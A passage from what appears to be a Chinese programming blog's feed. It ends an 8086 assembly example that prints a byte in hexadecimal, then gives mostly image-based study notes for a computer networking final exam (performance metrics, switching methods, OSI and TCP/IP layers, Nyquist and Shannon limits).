->  11h + 30h = 64d ->A    add dl,7 ;================halt endNUA:    ADD DL,30H ; 把数字转换成相应的字符    MOV AH,2  ;2号调用，显示高四位字符    INT 21H    MOV DL,VARY ;  dl =  vary    AND DL,0fH  ;此时取低四位    CMP DL,0AH  ;比较低四位，若低四位 < a 则跳转到nub    JB NUB     ADD DL,7  ;同样若>a，需要+7 NUB:    ADD DL,30H     MOV AH,2    INT 21H    MOV DL,'h' ;显示h    MOV AH,2    INT 21H    mov ah,4ch; 退出程序    int 21h<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p>其中在使用ROR的时候要注意，这个指令的源操作数只能是1或者cl，也就是当位移数大于1的时候，要mov cl , 4  把具体位移个数存到cl中。</p>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 汇编 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络期末复习</title>
      <link href="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"/>
      <url>/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="第一章：计算机网络概述"><a href="#第一章：计算机网络概述" class="headerlink" title="第一章：计算机网络概述"></a>第一章：计算机网络概述</h1><h2 id="一、概念和功能"><a href="#一、概念和功能" class="headerlink" title="一、概念和功能"></a>一、概念和功能</h2><h3 id="1、计算机网络的概念："><a href="#1、计算机网络的概念：" class="headerlink" title="1、计算机网络的概念："></a>1、计算机网络的概念：</h3><p>​是一个将分散的、具有独立功能的计算机系统，通过通信设备与线路连接起来，由功能完善的软件实现资源共享和信息传递的系统。</p><h3 id="2、功能："><a href="#2、功能：" class="headerlink" title="2、功能："></a>2、功能：</h3><ul><li>数据通信</li><li>资源共享</li><li>分布式处理</li><li>提高可靠性</li><li>负载均衡</li></ul><h3 id="3、计算机网络发展历史"><a href="#3、计算机网络发展历史" class="headerlink" title="3、计算机网络发展历史"></a>3、计算机网络发展历史</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202213300157.png" alt="image-20211202213300157"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202213324038.png" alt="image-20211202213324038"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202213334438.png" alt="image-20211202213334438"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202213340832.png" alt="image-20211202213340832"></p><p>ISP：因特网服务提供者，如：中国移动，中国联通等</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202213450163.png" alt="image-20211202213450163"></p><h2 id="计算机网络组成和分类"><a href="#计算机网络组成和分类" class="headerlink" title="计算机网络组成和分类"></a>计算机网络组成和分类</h2><h3 id="1、组成"><a href="#1、组成" class="headerlink" title="1、组成"></a>1、组成</h3><p>硬件、软件、协议（一系列规则约定的集合）</p><h3 id="2、工作方式"><a href="#2、工作方式" class="headerlink" title="2、工作方式"></a>2、工作方式</h3><p>端系统之间的通信方式通常可划分为两大类：</p><p>客户服务器方式（C/S 方式）</p><p> 即 Client/Server 方式，简称为 C/S 方式。</p><p>对等方式（P2P 方式）</p><p>  即 PeertoPeer方式 ，简称为P2P方式。</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202213648933.png" alt="image-20211202213648933"></p><h3 id="3、功能组成"><a href="#3、功能组成" class="headerlink" title="3、功能组成"></a>3、功能组成</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202213708471.png" alt="image-20211202213708471"></p><h3 id="4、计算机网络的分类"><a href="#4、计算机网络的分类" class="headerlink" title="4、计算机网络的分类"></a>4、计算机网络的分类</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202213859530.png" alt="image-20211202213859530"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202213931082.png" alt="image-20211202213931082"></p><h2 id="性能指标"><a href="#性能指标" class="headerlink" title="性能指标**"></a>性能指标**</h2><h3 id="1、速率"><a href="#1、速率" class="headerlink" title="1、速率"></a>1、速率</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202214026665.png" alt="image-20211202214026665"></p><h3 id="2、带宽"><a href="#2、带宽" class="headerlink" title="2、带宽"></a>2、带宽</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202214115741.png" alt="image-20211202214115741"></p><p>这里需要注意，在曼彻斯特编码的时候，由于曼彻斯特编码，在一个周期内要发送两次脉冲，也就是比要发送的数据多出一倍，因此需要的带宽是原始基带的两倍。</p><p>带宽是值能传送的最高速率，一般达不到这个速率。</p><h3 id="3、吞吐量"><a href="#3、吞吐量" class="headerlink" title="3、吞吐量"></a>3、吞吐量</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202214530770.png" alt="image-20211202214530770"></p><h3 id="4、时延"><a href="#4、时延" class="headerlink" title="4、时延"></a>4、时延</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202214654044.png" alt="image-20211202214654044"></p><h3 id="5、时延带宽积"><a href="#5、时延带宽积" class="headerlink" title="5、时延带宽积"></a>5、时延带宽积</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202214819241.png" alt="image-20211202214819241"></p><p>需要注意的是时延带宽积的单位是bit</p><h3 id="6、往返时延RTT"><a href="#6、往返时延RTT" class="headerlink" title="6、往返时延RTT"></a>6、往返时延RTT</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202214953133.png" alt="image-20211202214953133"></p><h3 id="7、信道利用率"><a href="#7、信道利用率" class="headerlink" title="7、信道利用率"></a>7、信道利用率</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202215026451.png" alt="image-20211202215026451"></p><p>D=D0/(1-U)  </p><p>其中D0表示网络空闲时延，D表示网络当前时延，U表示利用率</p><p>例题：</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202215652646.png" alt="image-20211202215652646"></p><h2 id="分层结构"><a href="#分层结构" class="headerlink" title="分层结构**"></a>分层结构**</h2><h3 id="1、为什么要分层（WHY？）"><a href="#1、为什么要分层（WHY？）" class="headerlink" title="1、为什么要分层（WHY？）"></a>1、为什么要分层（WHY？）</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202220017825.png" alt="image-20211202220017825"></p><h3 id="2、怎么分层（HOW？）"><a href="#2、怎么分层（HOW？）" class="headerlink" title="2、怎么分层（HOW？）"></a>2、怎么分层（HOW？）</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202220319730.png" alt="image-20211202220319730"></p><h3 id="3、都有哪些分层（WHAT？）"><a href="#3、都有哪些分层（WHAT？）" class="headerlink" title="3、都有哪些分层（WHAT？）"></a>3、都有哪些分层（WHAT？）</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202220418294.png" alt="image-20211202220418294"></p><h3 id="协议，服务"><a href="#协议，服务" class="headerlink" title="协议，服务"></a>协议，服务</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202220712371.png" alt="image-20211202220712371"></p><p>协议是水平的，服务是垂直的，第N层向N+1层提供服务。</p><h3 id="概念总结"><a href="#概念总结" class="headerlink" title="概念总结"></a>概念总结</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202220939429.png" alt="image-20211202220939429"></p><h2 id="互联网的核心部分"><a href="#互联网的核心部分" class="headerlink" title="互联网的核心部分"></a>互联网的核心部分</h2><p>在网络核心部分起特殊作用的是路由器，它是一种专用计算机（但不能叫主机）。<br>路由器是实现分组交换 (packet switching) 的关键构件，其任务是转发收到的分组，这是网络核心部分最重要的功能。<br>为了理解分组交换，首先了解电路交换的基本概念。</p><h3 id="电路交换"><a href="#电路交换" class="headerlink" title="电路交换"></a>电路交换</h3><p>1、电路交换的特点</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202231034504.png" alt="image-20211202231034504"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202231051635.png" alt="image-20211202231051635"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202231128477.png" alt="image-20211202231128477"></p><h4 id="交换的含义"><a href="#交换的含义" class="headerlink" title="交换的含义"></a>交换的含义</h4><p>在这里，“交换”(switching)的含义就是转接 —— 把一条电话线转接到另一条电话线，使它们连通起来。<br>从通信资源的分配角度来看，“交换”就是按照某种方式动态地分配传输线路的资源。 </p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202231335150.png" alt="image-20211202231335150"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202231521771.png" alt="image-20211202231521771"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203203955485.png" alt="image-20211203203955485"></p><h3 id="分组交换"><a href="#分组交换" class="headerlink" title="分组交换**"></a>分组交换**</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202231614038.png" alt="image-20211202231614038"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202231632033.png" alt="image-20211202231632033"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202231649610.png" alt="image-20211202231649610"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203204058194.png" alt="image-20211203204058194"></p><h3 id="报文交换的优缺点"><a href="#报文交换的优缺点" class="headerlink" title="报文交换的优缺点"></a>报文交换的优缺点</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203204027266.png" alt="image-20211203204027266"></p><h3 id="不同交换方式的比较"><a href="#不同交换方式的比较" class="headerlink" title="不同交换方式的比较"></a>不同交换方式的比较</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202231746186.png" alt="image-20211202231746186"></p><p>电路交换在通信阶段一直都要占用资源，这样网络利用率比较低。</p><p>分组交换是把报文分成n个组，然后每个分组都要加上头部信息（目的地址，源地址等信息）。每个分组可以走不同的路由器，因为每个分组都携带了相关信息，因此他们最终到达同一个终点。至于可靠传输，后面会有相应的协议控制。因此分组交换是现在使用的通信方式。</p><p>报文交换，把全部报文发送值路由器，然后由路由器存储转发。这种方式缺点很明显，报文很大，传输太慢。</p><p><strong>分组交换的方式要比报文交换的方式快很多。</strong></p><p>考点见题目总结。</p><h2 id="分层模型"><a href="#分层模型" class="headerlink" title="分层模型"></a>分层模型</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202221056104.png" alt="image-20211202221056104"></p><p>OSI7层网络模型，由于实现困难等问题，只是法定标准，现在市场使用的是TCP/IP 4层模型。它参考了OSI模型，但是进行了简化。至于5层模型是为了方便学习。</p><h3 id="OSI7层模型"><a href="#OSI7层模型" class="headerlink" title="OSI7层模型"></a>OSI7层模型</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202221339587.png" alt="image-20211202221339587"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202221352362.png" alt="image-20211202221352362"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202221421115.png" alt="image-20211202221421115"></p><p>所谓端到端值两个主机之间的进程通信，比如QQ，微信等。</p><p>所谓点到点是指，通信过程只关注下一条，并不关心具体的终点。</p><p>例题：在OSI参考模型中，自下而上第一个提供端到端服务的层次是（传输层）</p><h3 id="OSI通信过程"><a href="#OSI通信过程" class="headerlink" title="OSI通信过程"></a>OSI通信过程</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202222010432.png" alt="image-20211202222010432"></p><h3 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202222101154.png" alt="image-20211202222101154"></p><h3 id="表示层"><a href="#表示层" class="headerlink" title="表示层"></a>表示层</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202222115756.png" alt="image-20211202222115756"></p><h3 id="会话层"><a href="#会话层" class="headerlink" title="会话层"></a>会话层</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202222142383.png" alt="image-20211202222142383"></p><h3 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202222152730.png" alt="image-20211202222152730"></p><h3 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202222205271.png" alt="image-20211202222205271"></p><h3 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202222213939.png" alt="image-20211202222213939"></p><h3 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202222221763.png" alt="image-20211202222221763"></p><h3 id="TCP-x2F-IP模型"><a href="#TCP-x2F-IP模型" class="headerlink" title="TCP/IP模型"></a>TCP/IP模型</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202222315720.png" alt="image-20211202222315720"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202222332681.png" alt="image-20211202222332681"></p><h3 id="5层参考模型"><a href="#5层参考模型" class="headerlink" title="5层参考模型"></a>5层参考模型</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202222354631.png" alt="image-20211202222354631"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211202222404698.png" alt="image-20211202222404698"></p><h2 id="第一章题目总结"><a href="#第一章题目总结" class="headerlink" title="第一章题目总结 :)"></a>第一章题目总结 :)</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203183507827.png" alt="image-20211203183507827"></p><p>运输层主要负责主机中两个进程通信，也就是端到端的通信。传输单位是报文段。</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203183738746.png" alt="image-20211203183738746"></p><h3 id="考研题"><a href="#考研题" class="headerlink" title="考研题**"></a>考研题**</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203183919599.png" alt="image-20211203183919599"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203183948235.png" alt="image-20211203183948235"></p><p>在计算的时候要注意单位转换。</p><p>1000B = 1k = 1*8 kb   （如果题目给的数据包单位是k或M ,速率是mb/s 则需要把k或M 转成 kb/s 或mb/s 就是 * 8）。</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203184256927.png" alt="image-20211203184256927"></p><p>从这个题目可以看出来，报文交换是全部一起发送，而分组交换快的原因是因为，在第一个分组数据发送完成后，一边发送一边查找路由。相当于两个线程同时进行。</p><p>在计算分组交换的时间的时候，有几个路由器就加上几个单个分组的发送的时间。</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203184511874.png" alt="image-20211203184511874"></p><h1 id="第二章：物理层"><a href="#第二章：物理层" class="headerlink" title="第二章：物理层"></a>第二章：物理层</h1><h2 id="第二章导图"><a href="#第二章导图" class="headerlink" title="第二章导图"></a>第二章导图</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203185414493.png" alt="image-20211203185414493"></p><h2 id="物理层的基本概念"><a href="#物理层的基本概念" class="headerlink" title="物理层的基本概念"></a>物理层的基本概念</h2><p>物理层解决如何在连接各种计算机的传输媒体上传输数据比特流，而不是指具体的传输媒体。 物理层主要任务：确定与传输媒体接口有关的一些特性——–&gt;定义标准</p><p>物理层协议主要关心与传输媒体的接口特性，这些特性包括：</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203193416823.png" alt="image-20211203193416823"></p><h2 id="数据通信的基础知识"><a href="#数据通信的基础知识" class="headerlink" title="数据通信的基础知识"></a>数据通信的基础知识</h2><h3 id="传输模型"><a href="#传输模型" class="headerlink" title="传输模型"></a>传输模型</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203193501428.png" alt="image-20211203193501428"></p><h3 id="相关术语"><a href="#相关术语" class="headerlink" title="相关术语"></a>相关术语</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203193533013.png" alt="image-20211203193533013"></p><h3 id="三种通信方式"><a href="#三种通信方式" class="headerlink" title="三种通信方式"></a>三种通信方式</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203193629479.png" alt="image-20211203193629479"></p><h3 id="串行通信和并行通信"><a href="#串行通信和并行通信" class="headerlink" title="串行通信和并行通信"></a>串行通信和并行通信</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203193733618.png" alt="image-20211203193733618"></p><h3 id="同步传输和异步传输"><a href="#同步传输和异步传输" class="headerlink" title="同步传输和异步传输"></a>同步传输和异步传输</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203193804710.png" alt="image-20211203193804710"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203193832478.png" alt="image-20211203193832478"></p><h3 id="码元"><a href="#码元" class="headerlink" title="码元"></a>码元</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203194042590.png" alt="image-20211203194042590"></p><h3 id="速率"><a href="#速率" class="headerlink" title="速率"></a>速率</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203194321018.png" alt="image-20211203194321018"></p><p>例如：</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203194522177.png" alt="image-20211203194522177"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203195321722.png" alt="image-20211203195321722"></p><h3 id="波特"><a href="#波特" class="headerlink" title="波特"></a>波特</h3><p>码元的传输速率，单位是Baud， 简写B </p><h3 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203195403676.png" alt="image-20211203195403676"></p><h2 id="奈氏准则"><a href="#奈氏准则" class="headerlink" title="奈氏准则**"></a>奈氏准则**</h2><h3 id="失真"><a href="#失真" class="headerlink" title="失真"></a>失真</h3><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203195649283.png" alt="image-20211203195649283"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203195832917.png" alt="image-20211203195832917"></p><p>因此为了保证信息传输的正确，需要限制码元传输速率。</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203195953250.png" alt="image-20211203195953250"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203200300245.png" alt="image-20211203200300245"></p><p>从公式来看，若每个码元携带的信息越多，则传输的速率也大，带宽越大，传输的速率越大。但是在实际应用中，这些都是有上限的。</p><h2 id="香农定理"><a href="#香农定理" class="headerlink" title="香农定理"></a>香农定理</h2><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203200605448.png" alt="image-20211203200605448"></p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203200626171.png" alt="image-20211203200626171"></p><p>至于信噪比为什么用dB = 10log10(S/N)表示，是因为一般传输的功率远远大于噪声的功率，因此S/N这个数字很大，为了更加直观的表示数字，就换个一种方式表示。</p><p><img src="/2021/12/02/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/image-20211203200957210.png" alt="image-20211203200957210"></p><p><img 